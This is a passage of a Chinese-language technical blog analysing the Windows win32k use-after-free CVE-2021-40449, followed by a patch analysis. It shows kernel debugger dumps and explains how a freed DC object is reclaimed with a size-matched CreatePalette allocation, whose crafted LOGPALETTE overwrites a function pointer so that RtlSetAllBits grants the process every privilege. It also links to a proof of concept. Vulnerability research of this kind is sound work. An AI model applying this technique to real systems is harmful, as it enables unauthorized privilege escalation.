&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pool ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 注意，此时DC对象地址距离堆头地址为0x30大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>Pool page ffff885e80063030 region is Paged session pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>ffff885e80063000 size: e30 previous size: &lt;span style="color:#ae81ff">0&lt;/span> (Free ) &lt;span style="color:#f92672">*&lt;/span>GDev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Pooltag GDev : Gdi pdev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063e30 size: &lt;span style="color:#ae81ff">70&lt;/span> previous size: &lt;span style="color:#a6e22e">e30&lt;/span> (Free) Free
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063ea0 size: b0 previous size: &lt;span style="color:#ae81ff">70&lt;/span> (Free ) Usqm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffff885e80063f50 size: b0 previous size: &lt;span style="color:#a6e22e">b0&lt;/span> (Allocated) Usqm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> kb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># RetAddr : Call Site
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b95d39f4 : win32kbase&lt;span style="color:#f92672">!&lt;/span>Win32AllocPool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">01&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b95d0042 : win32kbase&lt;span style="color:#f92672">!&lt;/span>AllocateObject&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xc4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">02&lt;/span> ffff880c&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b9309ecc : win32kbase&lt;span style="color:#f92672">!&lt;/span>PALMEMOBJ&lt;span style="color:#f92672">::&lt;/span>bCreatePalette&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xb2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">03&lt;/span> fffff800&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>b175a193 : win32kfull&lt;span style="color:#f92672">!&lt;/span>NtGdiCreatePaletteInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xcc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">04&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2cb2604 : nt&lt;span style="color:#f92672">!&lt;/span>KiSystemServiceCopyEnd&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">05&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>e44c2fe1 : win32u&lt;span style="color:#f92672">!&lt;/span>NtGdiCreatePaletteInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">06&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000&lt;/span>d94 : cve_2021_40449&lt;span style="color:#f92672">!&lt;/span>createPaletteofSize1&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xd1&lt;/span> [C:&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>Users&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>mimi&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>source&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>repos&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>test&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>cve&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2021&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">40449&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>main.cpp &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">71&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2&lt;/span>e &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2e9b26f : &lt;span style="color:#ae81ff">0x000000d1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a374ef69
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2f&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a39e1a4a : gdi32full&lt;span style="color:#f92672">!&lt;/span>GdiPrinterThunk&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x21f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a61889e4 : USER32&lt;span style="color:#f92672">!&lt;/span>__ClientPrinterThunk&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x3a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2cb6dc4 : ntdll&lt;span style="color:#f92672">!&lt;/span>KiUserCallbackDispatcherContinue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a2e7edda : win32u&lt;span style="color:#f92672">!&lt;/span>NtGdiResetDC&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x14&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3682371 : gdi32full&lt;span style="color:#f92672">!&lt;/span>ResetDCWInternal&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x17a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">34&lt;/span> &lt;span style="color:#ae81ff">00007ff&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>e44c3296 : GDI32&lt;span style="color:#f92672">!&lt;/span>ResetDCW&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x31&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#f92672">:&lt;/span> cve_2021_40449&lt;span style="color:#f92672">!&lt;/span>main&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x146&lt;/span> [C:&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>Users&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>mimi&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>source&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>repos&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>test&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>cve&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2021&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">40449&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>main.cpp &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span> &lt;span style="color:#ae81ff">685&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>win32kbase!Win32AllocPool代码如下，最终是通过调用&lt;code>ExAllocatePoolWithTag&lt;/code>申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">Win32AllocPool&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v2; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v3; &lt;span style="color:#75715e">// rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> a2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#a6e22e">IsWin32AllocPoolImplSupported_0&lt;/span>() &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Win32AllocPoolImpl_0&lt;/span>(&lt;span style="color:#ae81ff">33&lt;/span>i64, v3, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211111140552152" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111140552152.png" />&lt;/p>
&lt;p>同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。&lt;/p>
&lt;p>
&lt;img alt="image-20211112195951766" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112195951766.png" />&lt;/p>
&lt;p>通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> _RTL_BITMAP {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG SizeOfBitMap;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG &lt;span style="color:#f92672">*&lt;/span>Buffer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} RTL_BITMAP, &lt;span style="color:#f92672">*&lt;/span>PRTL_BITMAP;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="image-20211112200708126" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112200708126.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e80063000&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x750&lt;/span> &lt;span style="color:#75715e">// 此处为RtlBitMap地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063750&lt;/span> ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063760&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063770&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063780&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063790&lt;/span> ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>a0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>b0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800637&lt;/span>c0 ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff ffffffff&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>ffffffff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 &lt;span style="color:#75715e">// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">000000&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839020 &lt;span style="color:#ae81ff">41414141&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">41414141&lt;/span> &lt;span style="color:#ae81ff">41414141&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">41414141&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839040 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839050 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839060 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839070 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a3839080 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9d0 &lt;span style="color:#ae81ff">00000006&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">02&lt;/span>&lt;span style="color:#ae81ff">880000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">800000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9e0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#ae81ff">800000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9f0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea00 &lt;span style="color:#ae81ff">20010000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">0000000f&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea10 &lt;span style="color:#ae81ff">000001e0&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00001000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea20 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ee18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea30 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f1007f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea40 ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f1007f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>&lt;span style="color:#ae81ff">10080&lt;/span>c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用DC里面的函数指针之前，自身权限位为正常权限。&lt;/p>
&lt;p>
&lt;img alt="image-20211112202144360" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202144360.png" />&lt;/p>
&lt;p>调用函数指针之后，可以看到权限位全部置为了1&lt;/p>
&lt;p>
&lt;img alt="image-20211112202350655" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202350655.png" />&lt;/p>
&lt;h4 id="补丁分析">补丁分析&lt;/h4>
&lt;p>在&lt;strong>漏洞利用分析&lt;/strong>里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。&lt;/p>
&lt;p>我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。&lt;/p>
&lt;p>所以判断DC对象异常可以通过判断DC对象的引用次数实现。&lt;/p>
